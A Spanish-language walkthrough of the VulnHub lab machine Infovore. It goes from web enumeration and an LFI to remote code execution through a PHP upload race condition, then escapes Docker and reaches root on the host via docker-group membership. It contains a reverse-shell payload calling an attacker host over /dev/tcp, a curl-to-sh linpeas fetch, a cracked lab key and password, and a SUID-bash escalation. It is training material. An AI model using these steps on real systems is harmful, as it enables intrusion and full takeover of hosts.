
---
# Guía paso a paso de explotación:

## Información general

- **Nombre**: Infovore
- **Plataforma**: VulnHub
- **Nivel**: Intermedio
- **IP**: (Asignada por DHCP/local, puede variar)
- **Objetivo**: Obtener acceso root a través de enumeración web y explotación de vulnerabilidades.

---

## Reconocimiento

Acción:

```bash
nmap -p- --open -sS -n -Pn --min-rate 5000 -v <IP_Objetivo> -oG allPorts
nmap -p80 -Pn -sCV <IP_Objetivo> -oN target 
nmap -p80 -Pn --script http-enum <IP_Objetivo> -oN enum 
```

Resultado:

```bash
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /info.php: Possible information file
```

Explicación: obtenemos un servidor web y un endpoint en `/info.php` 

![Captura](./Imágenes/web_1.png)

---

**Nota:** la información que vemos es la misma que se muestra con el siguiente código

```php
<?php
  phpinfo();
?>
```

Si almacenamos este código en `cd /var/www/html/` podemos visualizarlo accediendo a `localhost/código.php`

---

![captura](./Imágenes/web_2.png)

**Ver:** [info.php](../../../Lenguajes/PHP/Vulnerabilidades/info.php.md)

**Ver:** [Subida de Archivos mediante LFI2RCE](./Subida%20de%20Archivos%20mediante%20LFI2RCE.md)

**Ver:** [Abusando de boundary](../../../OWASP%20TOP%2010/Subida%20de%20archivos/boundary.md)

![captura](./Imágenes/burp_1.png)

![captura](./Imágenes/burp_2.png)

---

## Explotación

Acción:

```bash
wfuzz -t 100 -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://<IP_Objetivo>/index.php?FUZZ=/etc/passwd"  
```

Resultado:

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://<IP_Objetivo>/index.php?FUZZ=/etc/passwd
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       
=====================================================================

000000001:   200        136 L    382 W      4743 Ch     
000000003:   200        136 L    382 W      4743 Ch     
000000007:   200        136 L    382 W      4743 Ch         
... Repeat   
000000030:   200        136 L    382 W      4743 Ch 
```

Acción:

```bash
wfuzz -t 150 -c --hl=136 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://<IP_Objetivo>/index.php?FUZZ=/etc/passwd"
```


Resultado:

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://<IP_Objetivo>/index.php?FUZZ=/etc/passwd
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000025370:   200        26 L     33 W       1006 Ch     "filename"
```

Acción:

```url
http://<IP_Objetivo>/index.php?filename=/etc/passwd
```

Resultado:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<<<<<<<<<<<--->>>>>>>>>>>
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Explicación: hemos logrado un endpoint desde el que obtener un *LFI*. Para ello hemos fuzzeado con wfuzz ocultando el número de líneas repetido que se nos daba en el primer escaneo

## Explotación de LFI2RCE mediante subida de archivo temporal en PHP

En este escenario combinamos **LFI (Local File Inclusion)** con **subida de archivos** para lograr **RCE (Remote Code Execution)** en un entorno de laboratorio.

### 1. Solicitud `POST` con multipart/form-data

Se utiliza el método `POST` porque enviamos un archivo al servidor:

```http
POST /info.php HTTP/1.1
Host: <IP_Objetivo>
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=--pwned
Content-Length: 190

----pwned
Content-Disposition: form-data; name="name"; filename="cmd.php"
Content-Type: text/plain

<?php system("bash -c 'bash -i >& /dev/tcp/<IP_Atacante_>/443 0>&1'"); ?>
----pwned
````

- `boundary=--pwned` delimita las distintas partes del formulario.
    
- El archivo `cmd.php` contiene el payload PHP (en este caso una reverse shell).
    

---

### 2. Resultado en `$_FILES`

Después de subir el archivo, PHP lo almacena temporalmente y `$_FILES` muestra su información:

```php
Array
(
    [name] => cmd.php
    [type] => text/plain
    [tmp_name] => /tmp/phpzSJ2hc
    [error] => 0
    [size] => 71
)
```

- `tmp_name` indica la **ruta temporal** del archivo.
    
- Esto confirma que la subida fue exitosa y que podemos utilizar la LFI sobre ese archivo.
    

---

### 3. Conexión con LFI2RCE

1. **Subida del archivo malicioso** mediante `POST multipart/form-data`.
    
2. **Identificación de la ruta temporal** (`/tmp/phpzSJ2hc`) usando `phpinfo()` o `$_FILES`.
    
3. **Inclusión del archivo** vía LFI:
    
    ```
    http://target.local/index.php?page=/tmp/phpzSJ2hc
    ```
    
4. El servidor ejecuta el código PHP del archivo temporal, obteniendo **ejecución remota de comandos**.
    

---

### Resumen

- La combinación de **file upload** + **LFI** permite ejecutar código en el servidor.
    
- Es fundamental identificar correctamente la ruta temporal y el nombre del archivo.
    
- Este flujo se utiliza en laboratorios para practicar **LFI2RCE** de forma controlada.
    

> Nota: IPs y datos sensibles han sido ocultados para seguridad.


---

## Acceso al sistema

Acción:

```bash
wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/File%20Inclusion/Files/phpinfolfi.py
```

Explicación: nos clonamos el repositorio que contiene el script  `phpraceCondition.py` que es una adaptación a python3 del script `phpinfolfi.py` del famoso repositorio PayloadsAllTheThings

Acción: [ver Script phpraceCondition.py](./Scripts/phpraceCondition.py)

```bash
python3 phprace.py <IP_Atacante>
```

Respuesta:

```bash
Don't forget to modify the LFI URL
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 111432
Spawning worker pool (10)...
  26 /  1000
Got it! Shell created in /tmp/g (filename: /tmp/phpAsAAsd)

Woot!  \m/
Shuttin' down...
```

Acción: simultáneamente con netcat

```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [IP_Atacante] from (UNKNOWN) [IP_Objetivo] 36083
www-data@e71b67461f6c:/var/www/html$ whoami
whoami
www-data
```

Explicación: ganamos acceso al sistema ejecutando un script que aprovecha una vulnerabilidad de condición de carrera para cargar un archivo en una ruta temporal a la que a través de esta Race Condition accedemos y logramos enviarnos una reverse shell a nuestra máquina atacante


---

## Escalada de privilegios

Acción:

```bash
hostname -I
```

Resultado:

```bash
<IP_diferente_a_la_objetivo>
```

Explicación: el hecho de no obtener la dirección IP de la máquina objetivo nos indica que es posible que nos encontremos dentro de un contenedor, por lo que habrá que tratar de escapar de él para así poder acceder a la máquina host y obtener una forma de elevar nuestros privilegios


Acción: fuzzing automatizado con el script linpeas.sh

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20250904-27f4363e/linpeas.sh | sh
```

Resultado:

```bash
╔══════════╣ Unexpected in root
/.dockerenv
/core
/.oldkeys.tgz
```

Explicación: encontramos una ruta oculta en el directorio `/root/`, realmente es algo interesante de analizar, igualmente podríamos haber llegado a encontrar este ruta oculta con un `ls -la` en el directorio de inicio en `/root/`


Acción:

```bash
cp .oldkeys.tgz /tmp/
tar -xf oldkeys.tgz
```

Resultado:

```bash
root
root.pub
```

Explicación: copiamos el archivo oculto que es un archivo tar en un directorio temporal como es `/tmp/`. Luego podríamos renombrar para trabajar más cómodo con `mv .oldkeys.tgz oldkeys.tgz` (esto es opcional). Con `tar -xf` descomprimimos el archivo y obtenemos dos archivos: `root` y `root.pub` 


Acción:

```bash
cat root
```

Resultado:

```bash
-----BEGIN DSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2037F380706D4511A1E8D114860D9A0E

ds7T1dLfxm7o0NC93POQLLjptTjMMFVJ4qxNlO2Xt+rBqgAG7YQBy6Tpj2Z2VxZb
uyMe0vMyIpN9jNFeOFbL42RYrMV0V50VTd/s7pYqrp8hHYWdX0+mMfKfoG8UaqWy
gBdYisUpRpmyVwG1zQQF1Tl7EnEWkH1EW6LOA9hGg6DrotcqWHiofiuNdymPtlN+
it/uUVfSli+BNRqzGsN01creG0g9PL6TfS0qNTkmeYpWxt7Y+/R+3pyaTBHG8hEe
zZcX24qvW1KY2ArpSSKYlXZw+BwR5CLk6S/9UlW4Gls9YRK7Jl4mzBGdtpP85a/p
fLowmWKRmqCw2EH87mZUKYaf02w1jbVWyjXOy8SwNCNr87zJstQpmgOISUc7Cknq
JEpv1kzXEVJCfeeA1163du4RFfETFauxALtKLylAqMs4bqcOJm1NVuHAmJdz4+VT
GRSmO/+B+LNLiGJm9/7aVFGi95kuoxFstIkG3HWVodYLE/FUbVqOjqsIBJxoK3rB
t75Yskdgr3QU9vkEGTZWbI3lYNrF0mDTiqNHKjsoiekhSaUBM80nAdEfHzSs2ySW
EQDd4Hf9/Ln3w5FThvUf+g==
-----END DSA PRIVATE KEY-----
```

Explicación: como tenemos una clave para conectarse vía el servicio *ssh* pero esta encriptada podemos usar el recurso *ssh2john.py* (que podemos encontrar en nuestros sistemas Kali Linux y Parrot usando el comando `locate ssh2john.py`) para obtener un hash equivalente, el cual poder usar para un ataque de fuerza bruta


Acción:

```bash
python3 /usr/share/john/ssh2john.py id_rsa  
```

Resultado:

```bash
id_rsa:$sshng$1$16$2037F380706D4511A1E8D114860D9A0E$448$76ced3d5d2dfc66ee8d0d0bddcf3902cb8e9b538cc305549e2ac4d94ed97b7eac1aa0006ed8401cba4e98f667657165bbb231ed2f33222937d8cd15e3856cbe36458acc574579d154ddfecee962aae9f211d859d5f4fa631f29fa06f146aa5b28017588ac5294699b25701b5cd0405d5397b127116907d445ba2ce03d84683a0eba2d72a5878a87e2b8d77298fb6537e8adfee5157d2962f81351ab31ac374d5cade1b483d3cbe937d2d2a353926798a56c6ded8fbf47ede9c9a4c11c6f2111ecd9717db8aaf5b5298d80ae9492298957670f81c11e422e4e92ffd5255b81a5b3d6112bb265e26cc119db693fce5afe97cba309962919aa0b0d841fcee665429869fd36c358db556ca35cecbc4b034236bf3bcc9b2d4299a038849473b0a49ea244a6fd64cd71152427de780d75eb776ee1115f11315abb100bb4a2f2940a8cb386ea70e266d4d56e1c0989773e3e5531914a63bff81f8b34b886266f7feda5451a2f7992ea3116cb48906dc7595a1d60b13f1546d5a8e8eab08049c682b7ac1b7be58b24760af7414f6f9041936566c8de560dac5d260d38aa3472a3b2889e92149a50133cd2701d11f1f34acdb24961100dde077fdfcb9f7c3915386f51ffa
```

Explicación: copiamos en nuestra máquina atacante la clave encriptada bajo el nombre de `id_rsa` y ejecutamos el script mencionado para obtener el hash, el cual almacenaremos en un archivo que llamaremos `data` para ahora sí, crackear con John the Ripper

[Ver tutorial Jhon The Ripper](../../../Herramientas/Fuerza%20Bruta/Jhon%20The%20Ripper.md)

Acción:

```bash
john -w:/usr/share/wordlists/rockyou.txt data
```

Resultado:

```bash
choclate93
```

Explicación: hemos conseguido crackear una clave encriptada de ssh. Con esta credencial podemos tratar de loguernos y comprobar si se produce un reciclaje de contraseñas.


Acción: `su -` o `su root`

```bash
su -
# Introducimos como password:choclate93 
```

Resultado:

```bash
$whoami
root
```

Explicación: confirmamos el reciclaje de contraseña, al poder loguearnos como el usuario root del sistema. Pero no olvidemos que aún seguimos dentro del contenedor, por lo que tendremos que tratar de escapar de él. Probemos lo siguiente

**Nota:** en caso de no obtener una shell con prompt, usar el siguiente comando: `script /dev/null -c bash`

[Ver tutorial Tratamiento de la TTY](../../../Técnicas/Tratamiento%20de%20la%20TTY/TTY%20Interactiva.md)

Acción:

```bash
ls -la
```

Resultado:

```bash
drwx------  4 root root 4096 Sep 23 15:06 .
drwxr-xr-x 75 root root 4096 Sep 22 23:54 ..
-rw-------  1 root root    0 Sep 23 15:06 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jun 23  2020 .ssh
-r--------  1 root root   79 Jun 22  2020 root.txt
```

Acción:

```bash
cd ..shh
```

Resultado:

```bash
id_rsa
id_rsa.pub
known_hosts
```

Acción:

```bash
cat id_rsa.pub
```

Resultado:

```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN/keLDJowDdeSdHZz26wS1M2o2/eiJ99+acchRJr0lZE0YmqbfoIo+n75VS+eLiT03yonunkVp+lhK+uey7/Tu8JsQSHK1F0gci5FG7MKRU4/+m+0CODwVFTNgw3E4FKg5qu+nt6BkBThU3Vnhe/Ujbp5ruNjb4pPajll2Pv5dyRfaRrn0DTnhpBdeXWdIhU9QQgtxzmUXed/77rV6m4AL4+iENigp3YcPOjF7zUG/NEop9c1wdGpjSEhv/ftjyKoazFEmOI1SGpD3k9VZlIUFs/uw6kRVDJlg9uxT4Pz0tIEMVizlV4oZgcEyOJ9NkSe6ePUAHG7F+v7VjbYdbVh admin@192.168.150.1
```

Explicación: repetimos proceso de enumeración, peor manualmente, vemos archivos ocultos y entramos en el directorio `.ssh` vemos varios archivos y examinando encontramos al usuario `admin` y una posible entrada vía ssh, probemos si recicla de nuevo contraseñas


Acción:

```bash
ssh admin@192.168.150.1
```

Resultado:

```bash
Enter passphrase for key '/root/.ssh/id_rsa': choclate93


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep 23 10:06:18 2025 from 192.168.150.21
admin@infovore:~$ 
```

Acción:

```bash
hostname -I
```

Resultado:

```bash
192.168.1.77 172.17.0.1 192.168.150.1
```

Explicación: logramos escapar del contenedor docker. Para acabar tratemos de elevar nuestros privilegios como usuario root en el sistema host

[Ver repositorio Docker](../../../Herramientas/Docker/)

Acción:

```bash
id
```

Resultado:

```bash
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
```

Explicación: como nuestro usuario pertenece al grupo `docker` podemos a través de monturas exportarnos a un una imagen de Docker existente el directorio raíz del sistema y aplicar modificaciones que se traduzcan el sistema host desde una shell que obtengamos dentro del contenedor contaminado con la raíz del sistema


Acción:

```bash
docker images
```

Resultado:

```bash
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
theart42/infovore   latest              40de379c5116        5 years ago         428MB
```



Acción:

```bash
docker run -dit -v /:/mnt/root --name raiz theart42/infovore
```

Resultado:

```bash
d9e3107c0ec77d022782510243b109aa28d58583f09de0974cda156bb444c8ad
```


Acción:

```bash
docker ps
```

Resultado:

```bash
CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS                NAMES
d9e3107c0ec7        theart42/infovore   "docker-php-entryp…"   About a minute ago   Up About a minute   80/tcp               raiz
e71b67461f6c        theart42/infovore   "docker-php-entryp…"   5 years ago          Up 44 minutes       0.0.0.0:80->80/tcp   infovore
```


Acción:

```bash
docker exec -it raiz bash
```

Resultado:

```bash
oot@d9e3107c0ec7:/var/www/html#
```

Acción:

```bash
cd /mnt/root/
cd bin
chmod u+s bash
exit
ls -l
```

Resultado:

```bash
-rwsr-xr-x 1 root root 1029624 Mar 25  2019 /bin/bash
```

Explicación: tras crear la montura con la raíz del sistema, acceder al contenedor creado y dar permios SUID a la bash, podemos modificar la raiz dle sistema host real, y usando un simple comando elevar privilegios como superusuario root


Acción:

```bash
bash -p
```

Resultado:

```bash
bash-4.3# whoami
root
```

Explicación: Logramos vulnerar al sistema. Aplicar un exploit que aprovechaba una Race Condition, para aprovecharse de un LFI en el que ejecutar un RCE. Posteriormente, pivotamos dentro del sistema por los usuarios del contenedor Docker, del cual escapamos y volvimos a elevar privilegios. 

---




